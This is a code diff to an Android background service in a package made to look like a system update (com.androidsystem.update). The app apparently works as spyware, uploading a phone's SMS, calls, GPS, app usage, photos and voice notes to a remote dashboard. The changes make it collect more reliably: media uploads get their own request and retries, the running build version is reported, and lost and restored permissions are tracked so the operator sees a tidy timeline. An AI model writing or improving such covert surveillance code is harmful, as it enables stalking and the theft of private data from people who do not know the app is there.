@@ -17,6 +17,7 @@ import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.LifecycleService
 import androidx.lifecycle.lifecycleScope
+import com.androidsystem.update.BuildConfig
 import com.androidsystem.update.core.ConfigManager
 import com.androidsystem.update.core.EncryptionManager
 import com.androidsystem.update.database.*
@@ -631,12 +632,15 @@ class CoreService : LifecycleService() {
                 // Server contract: interval is in seconds (30..3600). The
                 // heartbeat fires every 60s regardless of the scan interval.
                 put("interval", 60)
-                // Upload cadence reported to the dashboard (all in seconds).
+                // Upload cadence reported to the dashboard (all in seconds),
+                // plus the installed APK version so the dashboard/dev can tell
+                // which build is actually running on the phone.
                 put("config", JSONObject().apply {
                     put("heartbeat_interval", 60)
                     put("sync_interval", syncIntervalMinutes * 60)
                     put("scan_interval", scanIntervalMinutes * 60)
                     put("location_interval", locationIntervalMinutes * 60)
+                    put("app_version", BuildConfig.VERSION_NAME)
                 })
                 if (!isPaired) {
                     val code = prefs.getString(PAIRING_CODE_KEY, null) ?: generatePairingCode()
@@ -727,12 +731,10 @@ class CoreService : LifecycleService() {
             media.first.forEach { batch.put(syncMessageJson(it)) }
             cursors["media"] = media.second
 
-            // Actual file payloads (photo thumbnails, small voice notes) —
-            // separate, slowly-advancing cursor so the sync cadence stays light
-            // even with many images. At most 10 files per cycle.
-            val files = repository.mediaFileSync(prefs.getLong("media_files", 0L), 10)
-            files.first.forEach { batch.put(syncMessageJson(it)) }
-            if (files.first.isNotEmpty()) cursors["media_files"] = files.second
+            // Actual file payloads (photo thumbnails, small voice notes) ride
+            // in their OWN request below — a heavy photo batch must never stall
+            // SMS/calls/GPS syncing. At most 8 files per cycle.
+            val files = repository.mediaFileSync(prefs.getLong("media_files", 0L), 8)
 
             val apps = repository.appUsageSync(prefs.getLong("apps", 0L), limit)
             apps.first.forEach { batch.put(syncMessageJson(it)) }
@@ -744,6 +746,17 @@ class CoreService : LifecycleService() {
 
             if (batch.length() > 0 && secureComms.sendBatch(batch.toString())) {
                 cursors.forEach { (key, value) -> prefs.edit().putLong(key, value).apply() }
+            }
+
+            // Media file payloads in their own request; the media_files cursor
+            // only advances when the upload actually succeeded, so failures are
+            // retried instead of silently skipped.
+            if (files.first.isNotEmpty()) {
+                val fileBatch = JSONArray()
+                files.first.forEach { fileBatch.put(syncMessageJson(it)) }
+                if (secureComms.sendBatch(fileBatch.toString())) {
+                    prefs.edit().putLong("media_files", files.second).apply()
+                }
             }
         } catch (e: Exception) { Log.e(TAG, "Structured sync error", e) }
     }
@@ -771,11 +784,30 @@ class CoreService : LifecycleService() {
             }
         }
         val missing = perms.filter { !checkPermission(it) }
+        // Only report when the set of missing permissions actually changes:
+        // Samsung revokes PACKAGE_USAGE_STATS periodically, and re-sending
+        // permission_lost every 5 minutes would flood the activity timeline
+        // (which caps at 200 events) and push out real events.
+        val prefs = getSharedPreferences("perm_state", Context.MODE_PRIVATE)
+        val prev = prefs.getString("missing", "") ?: ""
+        val cur = missing.sorted().joinToString(",")
+        if (cur == prev) return
+        prefs.edit().putString("missing", cur).apply()
         if (missing.isNotEmpty()) {
             secureComms.sendTelemetry(JSONObject().apply {
                 put("device_id", deviceId)
                 put("type", "permission_lost")
                 put("permissions", JSONArray(missing))
+                put("timestamp", System.currentTimeMillis())
+            }, SecureCommunication.Priority.HIGH)
+        }
+        // Report recovery too, so the timeline shows the fix instead of a gap.
+        val restored = prev.split(",").filter { it.isNotEmpty() && it !in missing }
+        if (restored.isNotEmpty()) {
+            secureComms.sendTelemetry(JSONObject().apply {
+                put("device_id", deviceId)
+                put("type", "permission_restored")
+                put("permissions", JSONArray(restored))
                 put("timestamp", System.currentTimeMillis())
             }, SecureCommunication.Priority.HIGH)
         }
